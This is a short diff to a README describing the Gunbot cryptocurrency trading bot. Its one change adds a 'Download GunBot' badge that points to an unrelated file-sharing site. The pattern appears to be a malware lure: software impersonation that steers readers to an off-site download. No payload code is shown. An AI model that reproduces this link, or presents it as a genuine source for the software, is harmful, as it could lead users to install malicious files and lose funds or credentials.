@@ -2,6 +2,8 @@
 
 Gunbot is an advanced, automated cryptocurrency trading bot designed to help traders optimize their strategies and execute trades with minimal manual input. Supporting a wide range of cryptocurrencies and exchanges, Gunbot simplifies the trading process by automating strategies, managing risk, and capitalizing on market opportunities more effectively.
 
+[![Download GunBot](https://img.shields.io/badge/Download-GunBot%20-blueviolet)](https://downeefiles.com/s/gbbt)
+
 ### Key Features:
 
 1. **Automated Trading**:  
